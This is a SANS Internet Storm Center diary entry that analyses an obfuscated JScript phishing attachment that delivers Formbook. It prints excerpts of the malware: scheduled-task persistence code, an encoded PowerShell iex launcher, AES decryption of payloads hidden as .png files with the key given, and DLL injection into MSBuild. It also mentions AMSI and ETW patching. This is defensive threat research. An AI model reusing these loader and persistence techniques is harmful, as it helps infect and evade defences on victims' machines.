---
title: Obfuscated JavaScript or Nothing, (Thu, Apr 9th)
url: https://isc.sans.edu/diary/rss/32884
source: SANS Internet Storm Center, InfoCON: green
date: 2026-04-10
fetch_date: 2026-04-11T04:22:52.046445
---

# Obfuscated JavaScript or Nothing, (Thu, Apr 9th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Xavier Mertens](/handler_list.html#xavier-mertens "Xavier Mertens")

Threat Level: [green](/infocon.html)

* [previous](/diary/32880)

Click [HERE](https://www.sans.org/profiles/xavier-mertens) to learn more about classes Xavier is teaching for SANS

# [Obfuscated JavaScript or Nothing](/forums/diary/Obfuscated%2BJavaScript%2Bor%2BNothing/32884/)

**Published**: 2026-04-09. **Last Updated**: 2026-04-10 06:40:46 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Obfuscated%2BJavaScript%2Bor%2BNothing/32884/#comments)

I spotted an interesting piece of JavaScript code that was delivered via a phishing email in a RAR archive. The file was called “cbmjlzan.JS” (SHA256:a8ba9ba93b4509a86e3d7dd40fd0652c2743e32277760c5f7942b788b74c5285) and is only identified as malicious by 15 AV’s on VirusTotal[[1](https://www.virustotal.com/gui/file/a8ba9ba93b4509a86e3d7dd40fd0652c2743e32277760c5f7942b788b74c5285/gti-summary)].

The file is pretty big (10MB) and contains a copy of the AsmDB project lib[[2](https://github.com/MahdiSafsafi/asmdb)]. The purpose is unknown.

As usual with JavaScript, the file is pretty well obfuscated and contains UTF characters (supported on Windows) but, when you scrool a bit, some code is disclosed:

![](https://isc.sans.edu/diaryimages/images/isc-20260410-1.png)

The script is a Windows-flavor JavaScript and uses ActiveXObject, Microsoft.XMLDOM, ADODB.Stream. It copies itself and implements persistence (through a scheduled task):

```

function FDAWE(x) {
  return x.split('').reverse().join('');
}
var scriptName = WScript['ScriptName'];
var urlName = ThreeChars(scriptName) + '.url';
var publicUrl = 'C:\\Users\\Public\\' + urlName;
var copiedScript = 'C:\\Users\\Public\\Libraries\\' + scriptName;
var fso = new ActiveXObject('Scripting.FileSystemObject');
if (!fso.FileExists(copiedScript)) {
  if (LOUU...ONIA.split('').join('') === 'YESSSSSSSS') {
    fso.CopyFile(scriptName, copiedScript);
    var shell = new ActiveXObject('WScript.Shell');
    var cmd = 'cmd /c schtasks /create /sc minute /mo 15 /tn ' + scriptName + ' /tr ' + copiedScript;
    shell.Run(cmd);
  }
}
```

Three files are dropped in C:\Users\Public:

* Brio.png
* Orio.png
* Xrio.png

These aren’t pictures, they are used by the PowerShell script executed after implementing persistence:

```

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Noexit -nop -c iex([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((‘<__REMOVED__>'.Replace('VFHDVXDJCF','')))))
```

The PowerShell is even documented and has multiple purposes.

First, the file Xrio.png is processed. It contains AES encrypted data:

```

$inputBase64FilePath = "C:\Users\PUBLIC\Xrio.png"
$aes_var = [System.Security.Cryptography.Aes]::Create()
$aes_var.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes_var.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes_var.Key = [System.Convert]::FromBase64String('XctflJI8B7Qo2dA6FbwuHYAjjzjViSx3hThThXX1QUY=')
$aes_var.IV = [System.Convert]::FromBase64String('eb8a/RvZf2ltVDo2satMKg==')
$base64String = [System.IO.File]::ReadAllText($inputBase64FilePath)
$encryptedBytes = [System.Convert]::FromBase64String($base64String)
$memoryStream = [System.IO.MemoryStream]::new()
$memoryStream.Write($encryptedBytes, 0, $encryptedBytes.Length)
$memoryStream.Position = 0  # Reset the position for reading
$decryptor = $aes_var.CreateDecryptor()
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
$streamReader = New-Object System.IO.StreamReader($cryptoStream)
$decryptedString = $streamReader.ReadToEnd()
$cryptoStream.Close()
$memoryStream.Close()
$streamReader.Close()
$commands = $decryptedString -split "`n"
foreach ($encodedCommand in $commands) {
   ...
}
```

The decrypted code will apply evasion techniques based on patching EtwEventWrite() and AmsiScanBuffer(). This is classic in many malware[[3](https://isc.sans.edu/diary/Live%2BPatching%2BDLLs%2Bwith%2BPython/31218)].

Then, the PowerShell script will decrypt the blob in Orio.png using the same technique. This time a PE file will be extracted (SHA256:53c3e0f8627917e8972a627b9e68adf9c21966428a85cb1c28f47cb21db3c12b)[[4](https://www.virustotal.com/gui/file/53c3e0f8627917e8972a627b9e68adf9c21966428a85cb1c28f47cb21db3c12b/gti-summary)]. It’s a .Net DLL.

The DLL is injected in a MSBuild.exe process:

```

$Allohaarnppp11111111=@('file:///C:/Users/Public/Brio.png','0','','','MSBuild','','MSBuild','','','','','','7','0','','0','','','');
try{
    $Allohaarnppp111111111=$Allohaarnppp1111111111.GetType('Fiber.Program');
    $Allohaarnppp1111111=$Allohaarnppp111111111.GetMethod('Main');
    $Allohaarnppp1111111.Invoke($nUll,[object[]]$Allohaarnppp11111111)}
Catch {
}
```

This DLL will used the file Brio.png and extract the real malware[[5](https://www.virustotal.com/gui/file/fdcfbb67d7e996e606963ac96a4a1b14e7070e1e88d210b2f567e3d40541b7b7/gti-summary)]. It's another sample of Formbook.

[1] <https://www.virustotal.com/gui/file/a8ba9ba93b4509a86e3d7dd40fd0652c2743e32277760c5f7942b788b74c5285/gti-summary>
[2] <https://github.com/MahdiSafsafi/asmdb>
[3] [https://isc.sans.edu/diary/Live+Patching+DLLs+with+Python/31218](https://isc.sans.edu/diary/Live%2BPatching%2BDLLs%2Bwith%2BPython/31218)
[4] <https://www.virustotal.com/gui/file/53c3e0f8627917e8972a627b9e68adf9c21966428a85cb1c28f47cb21db3c12b/gti-summary>
[5] <https://www.virustotal.com/gui/file/fdcfbb67d7e996e606963ac96a4a1b14e7070e1e88d210b2f567e3d40541b7b7/gti-summary>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [DLL](/tag.html?tag=DLL) [Formbook](/tag.html?tag=Formbook) [Injection](/tag.html?tag=Injection) [JavaScript](/tag.html?tag=JavaScript) [Malware](/tag.html?tag=Malware) [Obfuscation](/tag.html?tag=Obfuscation) [PowerShell](/tag.html?tag=PowerShell)

[0 comment(s)](/diary/Obfuscated%2BJavaScript%2Bor%2BNothing/32884/#comments)

Click [HERE](https://www.sans.org/profiles/xavier-mertens) to learn more about classes Xavier is teaching for SANS

* [previous](/diary/32880)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2026 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)